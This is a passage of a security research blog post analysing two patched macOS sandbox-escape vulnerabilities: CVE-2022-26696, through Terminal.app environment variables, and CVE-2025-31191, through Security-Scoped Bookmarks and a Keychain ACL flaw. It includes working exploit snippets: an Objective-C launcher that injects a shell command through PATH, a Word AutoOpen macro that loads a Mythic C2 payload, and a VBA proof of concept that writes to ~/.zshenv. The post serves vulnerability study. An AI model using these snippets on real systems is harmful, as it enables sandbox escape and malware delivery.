+<h3 id="2-1-CVE-2022-26696-Sandbox-Escape-via-Terminal-app"><a href="#2-1-CVE-2022-26696-Sandbox-Escape-via-Terminal-app" class="headerlink" title="2.1 CVE-2022-26696: Sandbox Escape via Terminal.app"></a>2.1 CVE-2022-26696: Sandbox Escape via Terminal.app</h3><p>CVE-2022-26696 was a vulnerability that allowed sandboxed apps to escape the sandbox by setting <strong>specific environment variables</strong> when running Terminal.app, causing Terminal to inherit that environment.</p>
+<p>In Terminal&#x2019;s code, <code>isRunningInInstallEnvironment()</code> checks the <code>__OSINSTALL_ENVIRONMENT</code> env var:</p>
+<pre><code class="hljs bash">+(char)isRunningInInstallEnvironment {
+    <span class="hljs-keyword">if</span> (*(int8_t *)byte_10010617c == 0x1) {
+        rax = *(int8_t *)byte_10010617b;
+    } <span class="hljs-keyword">else</span> {
+        COND = getenv(<span class="hljs-string">&quot;__OSINSTALL_ENVIRONMENT&quot;</span>) != 0x0;
+        rax = COND_BYTE_SET(NE);
+        *(int8_t *)byte_10010617b = COND ? 0x1 : 0x0;
+        *(int8_t *)byte_10010617c = 0x1;
+    }
+    rax = sign_extend_64(rax);
+    <span class="hljs-built_in">return</span> rax;
+}
+</code></pre>
+<p>This checks whether the environment variable <code>__OSINSTALL_ENVIRONMENT</code> is set internally, and if it is, Terminal determines that it is <strong>running in the BaseSystem environment</strong>.</p>
+<p><em>* BaseSystem: Installation UI when booting from a macOS installation USB, macOS Recovery Mode, minimal system environment with BaseSystem.dmg mounted, etc.</em></p>
+<pre><code class="hljs bash">-(void *)init {
+    var_30 = self;
+    *(&amp;var_30 + 0x8) = *0x1000f4790;
+    rax = [[&amp;var_30 super] init];
+    r14 = rax;
+    <span class="hljs-keyword">if</span> (rax != 0x0) {
+        <span class="hljs-keyword">if</span> (*qword_100105e38 == 0x0) {
+            *qword_100105e38 = r14;
+        }
+        rbx = [[[NSProcessInfo processInfo] environment] mutableCopy];
+        <span class="hljs-keyword">if</span> ([objc_opt_class(r14) **isRunningInInstallEnvironment**] == 0x0) {
+            [rbx removeObjectForKey:@<span class="hljs-string">&quot;HOME&quot;</span>];
+            [rbx removeObjectForKey:@<span class="hljs-string">&quot;USER&quot;</span>];
+            [rbx removeObjectForKey:@<span class="hljs-string">&quot;LOGNAME&quot;</span>];
+            [rbx removeObjectForKey:@<span class="hljs-string">&quot;PATH&quot;</span>];
+            [rbx removeObjectForKey:@<span class="hljs-string">&quot;SHELL&quot;</span>];
+        }
+</code></pre>
+<p>Within the <code>init</code> function, if the value of isRunningInInstallEnvironment() is <code>NO</code>, Terminal is designed to delete key environment variables such as <code>HOME</code> and <code>PATH</code>. However, if this value is YES, the environment variables are not deleted and remain unchanged. Ultimately, by setting the single environment variable __OSINSTALL_ENVIRONMENT=1, Terminal.app will run without deleting the environment variables. This allows sandboxed apps to execute shell commands by running Terminal.</p>
+<p>By exploiting this vulnerability, you can achieve the desired results by performing the following actions within the sandbox app!</p>
+<ol>
+<li>Run Terminal.app with the <code>__OSINSTALL_ENVIRONMENT=1</code> environment variable</li>
+<li>Insert malicious commands into the <code>PATH</code> environment variable &#x2192; in the form of <code>$(malicious_command)</code></li>
+<li>Terminal accepts and executes the environment variables as is</li>
+<li>Execute malicious commands by bypassing the sandboxed app</li>
+</ol>
+<pre><code class="hljs bash">void sbxWithShellCommand(NSString *<span class="hljs-built_in">command</span>) {
+    FSRef appFSURL;
+    NSString *path = @<span class="hljs-string">&quot;/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal&quot;</span>;
+    OSStatus stat2 = FSPathMakeRef((const UInt8 *)[path UTF8String], &amp;appFSURL, NULL);
+    <span class="hljs-keyword">if</span> (stat2 &lt; 0) {
+        NSLog(@<span class="hljs-string">&quot;Something wrong: %d&quot;</span>,stat2);
+    }
+
+    LSApplicationParameters appParam;
+    appParam.version = 0;
+    appParam.flags = kLSLaunchDefaults;
+    appParam.application = &amp;appFSURL;
+    appParam.argv = NULL;
+
+    // Pass the <span class="hljs-built_in">command</span> to be executed as an environment variable.
+    NSString *finalCommand = [NSString stringWithFormat:@<span class="hljs-string">&quot;<span class="hljs-subst">$(%@)</span>&quot;</span>, <span class="hljs-built_in">command</span>];
+    NSDictionary *envs = @{@<span class="hljs-string">&quot;PATH&quot;</span>:finalCommand, @<span class="hljs-string">&quot;__OSINSTALL_ENVIRONMENT&quot;</span>:@<span class="hljs-string">&quot;1&quot;</span>};
+    appParam.environment = (__bridge CFDictionaryRef)envs;
+    appParam.asyncLaunchRefCon = NULL;
+    appParam.initialEvent = NULL;
+
+    CFArrayRef array = (__bridge CFArrayRef)@[];
+    OSStatus <span class="hljs-built_in">stat</span> = **LSOpenURLsWithRole**(array, kLSRolesAll, NULL, &amp;appParam, NULL, 0);
+
+    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">stat</span> &lt; 0) {
+        NSLog(@<span class="hljs-string">&quot;Something wrong: %d&quot;</span>, <span class="hljs-built_in">stat</span>);
+    }
+}
+</code></pre>
+<p>Apple&#x2019;s <a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.apple.com/documentation/coreservices/launch_services"><strong>LaunchServices API</strong></a> <code>LSOpenURLsWithRole()</code> is used to run Terminal, passing the shell command as an environment variable.</p>
+<p>Additionally, this vulnerability could also be exploited within Microsoft Word macros!</p>
+<pre><code class="hljs bash">Sub AutoOpen()
+MacScript (<span class="hljs-string">&quot;do shell script &quot;</span><span class="hljs-string">&quot;open -b com.apple.terminal --env __OSINSTALL_ENVIRONMENT=1 --env PATH=&apos;<span class="hljs-subst">$(/usr/bin/osascript -l JavaScript /path/.apfell.js)</span>&apos;&quot;</span><span class="hljs-string">&quot; &quot;</span>)
+End Sub</code></pre>
+<p>You can load the Mythic <strong>C2 JXA Payload</strong> by including it in a macro in a Word document.</p>
+<p>++ Apple has designated this vulnerability as <code>CVE-2022-26696</code> and modified Terminal so that it no longer trusts the <code>__OSINSTALL_ENVIRONMENT</code> environment variable.</p>
+<p>I checked each function based on my terminal (v2.14).</p>
+<p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image5.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image6.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image7.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image8.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image9.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>It has been changed so that it not only filters environment variables, but also checks a wider range of security conditions and structurally initializes the internal state.</p>
+<p>The structure that previously relied solely on <code>__OSINSTALL_ENVIRONMENT</code> has been removed, and security has been strengthened so that Terminal only operates in a normal launchd environment. Additionally, Launch Services has been modified to recognize whether the <strong>XPC</strong> client is in a sandboxed state.</p>
+<p>[TTApplication init] code</p>
+<pre><code class="hljs bash">TTApplication *__cdecl -[TTApplication init](TTApplication *self, SEL a2)
+{
+  TTApplication *v2; // rax
+  TTApplication *v3; // rbx
+  id v4; // rax
+  id v5; // rax
+  id v6; // r14
+  void *v7; // rax
+  id v8; // rax
+  id v9; // rax
+  id v10; // rax
+  id v11; // rax
+  struct objc_super v13; // [rsp+0h] [rbp-30h] BYREF
+
+  v13.receiver = self;
+  v13.cls = &amp;OBJC_CLASS___TTApplication;
+  v2 = (TTApplication *)objc_msgSendSuper2(&amp;v13, <span class="hljs-string">&quot;init&quot;</span>);
+  v3 = v2;
+  <span class="hljs-keyword">if</span> ( v2 )                                     // rax
+  {
+    <span class="hljs-keyword">if</span> ( !qword_1000FFE38 )
+      qword_1000FFE38 = v2;
+    v4 = objc_msgSend(&amp;OBJC_CLASS___NSProcessInfo, <span class="hljs-string">&quot;processInfo&quot;</span>);
+    v5 = objc_msgSend(v4, <span class="hljs-string">&quot;environment&quot;</span>);
+    v6 = objc_msgSend(v5, <span class="hljs-string">&quot;mutableCopy&quot;</span>);
+    v7 = (void *)objc_opt_class(v3);
+    <span class="hljs-keyword">if</span> ( !(unsigned __int8)objc_msgSend(v7, <span class="hljs-string">&quot;isRunningInInstallEnvironment&quot;</span>) )
+    {
+      objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFD90);// <span class="hljs-string">&quot;HOME&quot;</span>
+      objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFDB0);// <span class="hljs-string">&quot;USER&quot;</span>
+      objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFDD0);// <span class="hljs-string">&quot;LOGNAME&quot;</span>
+      objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFDF0);// <span class="hljs-string">&quot;PATH&quot;</span>
+      objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFE10);// <span class="hljs-string">&quot;SHELL&quot;</span>
+      <span class="hljs-keyword">if</span> ( (unsigned int)csr_check(2LL) )
+        objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFE30);
+    }
+    objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFE50);
+    objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFE70);
+    v3-&gt;_initialEnvironment = (NSDictionary *)objc_msgSend(v6, <span class="hljs-string">&quot;copy&quot;</span>);
+    objc_release(v6);
+    objc_msgSend(v3, <span class="hljs-string">&quot;setDelegate:&quot;</span>, v3);
+    v8 = objc_alloc(&amp;OBJC_CLASS___NSMutableIndexSet);
+    v3-&gt;_availableEquivalents = (NSMutableIndexSet *)objc_msgSend(v8, <span class="hljs-string">&quot;initWithIndexesInRange:&quot;</span>, 1LL, 9LL);
+    v3-&gt;_windowEquivalents = (NSMutableDictionary *)objc_alloc_init(&amp;OBJC_CLASS___NSMutableDictionary);
+    v9 = objc_msgSend(&amp;OBJC_CLASS___NSUserDefaults, <span class="hljs-string">&quot;standardUserDefaults&quot;</span>);
+    v10 = objc_msgSend(v9, <span class="hljs-string">&quot;objectForKey:&quot;</span>, off_1000FF878);
+    <span class="hljs-keyword">if</span> ( v10 )
+      objc_msgSend(v3, <span class="hljs-string">&quot;setDefaultShell:&quot;</span>, v10);
+    objc_msgSend(v3, <span class="hljs-string">&quot;addObserver:forKeyPath:options:context:&quot;</span>, v3, &amp;off_1000CFE90, 11LL, &amp;unk_1000A4548);
+    v11 = objc_msgSend(&amp;OBJC_CLASS___NSNotificationCenter, <span class="hljs-string">&quot;defaultCenter&quot;</span>);
+    objc_msgSend(
+      v11,
+      <span class="hljs-string">&quot;addObserver:selector:name:object:&quot;</span>,
+      v3,
+      <span class="hljs-string">&quot;handleWindowKeyChange:&quot;</span>,
+      NSWindowDidBecomeKeyNotification,
+      0LL);
+    v3-&gt;_currentWorkspace = (TTWorkspace *)objc_alloc_init(&amp;OBJC_CLASS___TTWorkspace);
+    objc_msgSend(&amp;OBJC_CLASS___NSColor, <span class="hljs-string">&quot;setIgnoresAlpha:&quot;</span>, 0LL);
+    objc_msgSend(v3, <span class="hljs-string">&quot;initLowSwapSpaceWatcher&quot;</span>);
+  }
+  <span class="hljs-built_in">return</span> v3;
+}</code></pre>
+<hr>
+<h3 id="2-2-CVE&#x2011;2025&#x2011;31191-Security&#x2011;Scoped-Bookmarks-based-Sandbox-Escape"><a href="#2-2-CVE&#x2011;2025&#x2011;31191-Security&#x2011;Scoped-Bookmarks-based-Sandbox-Escape" class="headerlink" title="2.2 CVE&#x2011;2025&#x2011;31191: Security&#x2011;Scoped Bookmarks based Sandbox Escape"></a>2.2 CVE&#x2011;2025&#x2011;31191: Security&#x2011;Scoped Bookmarks based Sandbox Escape</h3><p>CVE-2025-31191 is based on a structural flaw that allowed sandboxed apps on macOS to exploit <strong>Security-Scoped Bookmarks</strong> to access system resources without user approval.</p>
+<p>In addition to CVE-2022-26696 discussed in Section 2.1, there were various other Launch Services-based vulnerabilities. Subsequently, Apple strengthened App Sandbox policies within Launch Services to prevent such vulnerabilities. XPC clients are now able to recognize whether they are in a sandboxed state, rendering past vulnerabilities such as <strong>CVE-2022-26706</strong>, <strong>CVE-2021-30864</strong>, and <strong>CVE-2022-26696</strong> invalid.</p>
+<p>These changes have also affected the Microsoft Office for macOS environment. Office apps are now configured to strictly follow macOS sandbox policies, making it difficult to attempt initial penetration using macros as before. However, we focused our analysis on the <strong>SSB (Security-Scoped Bookmark)</strong> feature, which allows file access permissions to be stored like tokens, as it remains a potential threat.</p>
+<blockquote>
+<p><strong>Security-Scoped Bookmark?</strong></p>
+</blockquote>
+<p>macOS restricts app file access permissions for security reasons, and external files cannot be accessed without the user&#x2019;s explicit approval. One of the representative features used for this purpose is <strong>Security-Scoped Bookmark</strong>.</p>
+<p>This Bookmark allows users to store access permissions for specific files or directories like a token once they have granted access. Apps can then store this Bookmark and use it later to access files without requiring user approval again.</p>
+<p>Two key VBA APIs related to this feature have been newly introduced in the Office environment for macOS.</p>
+<ul>
+<li><p><strong>AppleScriptTask</strong></p>
+<p>  This API allows macros to execute predefined AppleScripts. However, these scripts must be located in the <code>~/Library/Application Scripts/[bundle ID]/</code> path, and since Office apps cannot access this path to create files, it was difficult to use macros for sandbox escape.</p>
+</li>
+<li><p><strong>GrantAccessToMultipleFiles</strong></p>
+<p>  This API prompts the user to select multiple files within the macro and grants access to those files outside the sandbox. It is particularly useful for large-scale tasks.</p>
+</li>
+</ul>
+<p>Among these, <code>AppleScriptTask</code> appeared to have no significant security issues, so we conducted a thorough analysis centered on the <code>GrantAccessToMultipleFiles</code> API.</p>
+<blockquote>
+<p><strong>SSB Abuse</strong></p>
+</blockquote>
+<p>Using the <code>GrantAccessToMultipleFiles</code> API, users can access files outside the sandbox by manually selecting and approving files. However, we discovered that <strong>the user&#x2019;s file access approval is retained even after rebooting</strong>. In other words, this approval information is <strong>permanently stored</strong> somewhere, and if exploited, it allows access to files outside the sandbox without additional user approval. !!</p>
+<p>Based on this, we were able to come up with the following scenario.</p>
+<ol>
+<li>The user selects a file normally and grants access permissions.</li>
+<li>These permissions are stored in the form of a Security-Scoped Bookmark.</li>
+<li>A malicious macro exploits this bookmark to access specific files without any additional approval.</li>
+<li>For example, manipulating an initial execution file such as <code>~/.zshenv</code> &#x2192; enables command execution outside the sandbox.</li>
+</ol>
+<blockquote>
+<p><strong>SSB exploitation through macros</strong></p>
+</blockquote>
+<p>Based on the above scenario, we conducted the following tests.</p>
+<ol>
+<li>Open Excel or Word and open a new document.</li>
+<li>Press the shortcut key <code>Alt + F11</code> &#x2192; Open the VBA editor.</li>
+<li>Select <code>Insert &gt; Module</code> from the top menu.</li>
+<li>Paste the code and execute it.<pre><code class="hljs bash">        Sub Poc_GrantAccess()
+            Dim scptPath As String
+            Dim fileAccessGranted As Boolean
+            Dim filePermissionCandidates
+            Dim payload As String
+        
+            <span class="hljs-string">&apos; Set the payload</span>
+<span class="hljs-string">            payload = &quot;echo pwn&quot;</span>
+<span class="hljs-string">        </span>
+<span class="hljs-string">            &apos;</span> Grant file permissions
+            scptPath = <span class="hljs-string">&quot;/Users/&quot;</span> &amp; Environ(<span class="hljs-string">&quot;USER&quot;</span>) &amp; <span class="hljs-string">&quot;/.zshenv&quot;</span>
+            filePermissionCandidates = Array(scptPath)
+            fileAccessGranted = GrantAccessToMultipleFiles(filePermissionCandidates)
+        
+            <span class="hljs-string">&apos; Create an Application Script</span>
+<span class="hljs-string">            Open scptPath For Output As #1</span>
+<span class="hljs-string">            Print #1, payload</span>
+<span class="hljs-string">            Close #1</span>
+<span class="hljs-string">        End Sub</span>
+<span class="hljs-string">        </span>
+<span class="hljs-string">```    </span>
+<span class="hljs-string">        </span>
+<span class="hljs-string">        </span>
+<span class="hljs-string"></span>
+<span class="hljs-string">![image.png](/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image10.png)</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">![image.png](/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image11.png)</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">If an SSB created based on user approval information is exploited, subsequent accesses may bypass the protection of the sandbox policy.</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">![image.png](/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image12.png)</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">echo pwn executed successfully.</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">&gt; **SSB Storage Location and Structure Analysis**</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">After checking where this bookmark is stored, we found that the data storing the user&apos;</span>s choice (file access approval) was stored <span class="hljs-keyword">in</span> a PLIST file inside the Containers directory.
+
+![image.png](/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image13.png)
+
+![image.png](/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image14.png)
+
+The `Containers` directory is a special location that is not subject to App Sandbox restrictions, so even sandboxed apps can **freely access** files <span class="hljs-keyword">in</span> this directory. This means that <span class="hljs-keyword">if</span> a malicious app can manipulate this PLIST file to artificially insert SSB, it can steal arbitrary file access permissions without separate user approval!
+
+However... this PLIST file is not a simple text file but is structured as a **signed binary format**. Therefore, simply overwriting values or adding entries is not easy... 
+
+&gt; **ScopedBookmarkAgent Analysis**
+
+To gain a deeper understanding of how this works, we reverse engineered the relevant macOS modules and analyzed their structure.
+
+By default, sandboxed apps must obtain file access permission from the user via an Open dialog to access external files. This Open dialog is handled by a sandbox-external service named `com.apple.appkit.xpc.openAndSavePanelService.xpc`.
+
+When the user selects a file, this service transmits the access permissions <span class="hljs-keyword">for</span> the selected file to the app <span class="hljs-keyword">in</span> the form of a sandbox extension. This extension is created by the kernel and is a token signed with `HMAC-SHA256`, containing the actual file path, permission information (such as `com.apple.app-sandbox.read-write`), file metadata, and more. Apps that receive this extension can access the file through the `libsystem_sandbox.dylib` sub-API.
+
+However, there was a limitation that this extension token was **invalidated upon each reboot**.
+
+To solve this, Apple introduced a new non-sandbox process called **ScopedBookmarkAgent**. This agent performs the following two roles.
+
+1. Verify the received sandbox extension and convert it into a Bookmark object that can be stored long-term.
+2. Generate and deliver a new sandbox extension token based on the stored Bookmark data.
+
+For example, apps like Microsoft Office can use SSB <span class="hljs-keyword">in</span> the following way!
+
+- User approves file access &#x2192; bookmark stored <span class="hljs-keyword">in</span> `securebookmarks.plist`
+- Subsequent access to the same file &#x2192; bookmark via ScopedBookmarkAgent &#x2192; new extension token generated
+
+This bookmark object is also signed with HMAC-SHA256, and the key used is calculated as follows.
+</code></pre>
+cryptoKey = HMAC-SHA256(secret, &#x201C;[bundle-id]&#x201D;)<br>```</li>
+</ol>
+<p>The <code>secret</code> used here is stored in the <code>com.apple.scopedbookmarksagent.xpc</code> item in <strong>macOS Keychain</strong>, making it very difficult for attackers to arbitrarily sign or manipulate bookmarks. Ultimately, in order to forge bookmarks for sandbox escape, attackers must steal the <strong>ScopedBookmarkAgent&#x2019;s</strong> signing key or be able to insert valid bookmarks indirectly. It&#x2019;s a bit complicated, isn&#x2019;t it?</p>
+<blockquote>
+<p><strong>Keychain ACL bypass</strong></p>
+</blockquote>
+<p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image15.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>On macOS, <strong>Keychain</strong> is a space for securely storing passwords and certificates. It can be considered similar to Windows Credential Manager.<br>An important feature of Keychain is that it has an <strong>Access Control List (ACL) that specifies which processes can access each item</strong>.</p>
+<p>The Keychain item that caught my attention was <code>com.apple.scopedbookmarksagent.xpc</code>, and its ACL was set to allow access only to <strong>ScopedBookmarkAgent</strong>.</p>
+<p>However&#x2026;!</p>
+<p>I discovered that this ACL only controls <strong>&#x2018;read&#x2019; permissions</strong>.</p>
+<p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image16.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>In other words, it was possible to delete existing items and register <strong>new items created</strong> by attackers with the same names!</p>
+<p>Attackers could even set <strong>ACL</strong>s for new items themselves and configure them so that ScopedBookmarkAgent could access them freely.</p>
+<p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image17.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>This could be verified using the command.</p>
+<p>As a result, if an attacker creates a new entry with a fixed secret value, ScopedBookmarkAgent will accept the key without suspicion and use it for signature verification.</p>
+<p>Based on the above, an attacker could exploit the ACL structure of the keychain and the signature key derivation structure to <strong>manipulate and sign arbitrary SSBs</strong>, thereby <strong>gaining a sandbox escape path</strong>.</p>
+<p>This vulnerability could affect all macOS sandboxed apps that use SSBs and was particularly dangerous because it could be exploited as a generic macOS Sandbox Escape technique not limited to a single app. </p>
+<p>In this article, I studied Sandbox Escape! It was fun&#x2026;!!!</p>
+<p>I&#x2019;ll study something interesting again next time~ &gt;_o</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://support.apple.com/en-us/122375">https://support.apple.com/en-us/122375</a></p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/">https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/</a></p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.microsoft.com/en-us/security/blog/2022/07/13/uncovering-a-macos-app-sandbox-escape-vulnerability-a-deep-dive-into-cve-2022-26706/">https://www.microsoft.com/en-us/security/blog/2022/07/13/uncovering-a-macos-app-sandbox-escape-vulnerability-a-deep-dive-into-cve-2022-26706/</a></p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://objectivebythesea.org/v4/talks/OBTS_v4_rWaisberg.pdf">https://objectivebythesea.org/v4/talks/OBTS_v4_rWaisberg.pdf</a></p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/yo-yo-yo-jbo/macos_app_structure">https://github.com/yo-yo-yo-jbo/macos_app_structure</a></p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://wojciechregula.blog/post/macos-sandbox-escape-via-terminal/">https://wojciechregula.blog/post/macos-sandbox-escape-via-terminal/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                <div class="post-meta mr-3">
+                  <i class="iconfont icon-category"></i>
+                  
+                  <a class="hover-with-bg" href="/categories/Research/">Research</a>
+                  
+                </div>
+                
+                
+                <div class="post-meta">
+                  <i class="iconfont icon-tags"></i>
+                  
+                  <a class="hover-with-bg" href="/tags/clalxk/">clalxk</a>
+                  
+                  <a class="hover-with-bg" href="/tags/MacOS/">MacOS</a>
+                  
+                  <a class="hover-with-bg" href="/tags/Sandbox-Escape/">Sandbox Escape</a>
+                  
+                </div>
+                
+              </div>
+
+              <div class="post-metas mb-3">
+                <a class="hover-with-bg" style="display: flex;" href="/author">
+                  <div class="link-avatar-page">
+                    <img src="/img/profile_clalxk.jpg" srcset="/img/loading.gif" alt="clalxk">
+                  </div>
+
+                  <div class="link-text">
+                    <div class="link-title">clalxk</div>
+                  </div>
+                </a>
+                <div class="link-text">
+                  <div class="link-more">
+                    <a href="/tags/clalxk">
+                      Read more
+                      <i class="iconfont icon-arrowdown"></i>
+                    </a>
+                  </div>
+                </div>
+              </div>
+
+              <hr>
+              <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
+              
+              <!--  -->
+              <p class="note note-warning">본 글은 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.ko" rel="external nofollow noopener noreferrer">CC BY-SA 4.0</a> 라이선스로 배포됩니다. 공유 또는 변경 시 반드시 출처를 남겨주시기 바랍니다.</p>
+              
+              
+              
+              <div class="post-prevnext row">
+                <article class="post-prev col-6">
+                  
+                  
+                  <a href="/2025/08/09/bekim/2025-08-09/">
+                    <i class="iconfont icon-arrowleft"></i>
+                    <span class="hidden-mobile">[하루한줄] CVE-2025-48384: Git CLI의 임의 파일 쓰기 취약점</span>
+                    <span class="visible-mobile">Previous</span>
+                  </a>
+                  
+                </article>
+                <article class="post-next col-6">
+                  
+                  
+                  <a href="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/">
+                    <span class="hidden-mobile">[Research] macOS: Part2 - Sandbox Escape (ko)</span>
+                    <span class="visible-mobile">Next</span>
+                    <i class="iconfont icon-arrowright"></i>
+                  </a>
+                  
+                </article>
+              </div>
+              
+            </div>
+            
+            <!-- Embed Section -->
+            <div style="width: 100%; height: 210px; margin-bottom: 50px; overflow: hidden;">
+              <iframe src="https://maily.so/hackyboiz/embed?src=embed" style="width: 100%; height: 100%; border: none;" frameborder="0"></iframe>
+            </div>            
+
+            
+            <!-- Comments -->
+            <article class="comments" id="comments">
+              
+              
+  <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+      var disqus_config = function () {
+        this.page.url = 'https://hackyboiz.github.io/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/';
+        this.page.identifier = '/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/';
+      };
+      function loadDisqus() {
+        (function () {
+          var d = document,
+            s = d.createElement('script');
+          s.src = '//' + 'hackyboiz' + '.disqus.com/embed.js';
+          s.setAttribute('data-timestamp', new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      }
+      waitElementVisible('disqus_thread', loadDisqus);
+    </script>
+    <noscript>Please enable JavaScript to view the
+      <a target="_blank" href="https://disqus.com/?ref_noscript" rel="external nofollow noopener noreferrer">comments powered by Disqus.</a>
+    </noscript>
+  </div>
+
+
+            </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+    <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+      <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
+
+    </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="external nofollow noopener noreferrer"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="external nofollow noopener noreferrer">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="/js/debouncer.js"></script>
+<script src="/js/main.js"></script>
+
+<!-- Plugins -->
+
+
+  
+    <script src="/js/lazyload.js"></script>
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
+  <script src="/js/clipboard-use.js"></script>
+
+
+
+
+
+
+
+  <script src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "[Research] macOS: Part2 - Sandbox Escape (en)&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
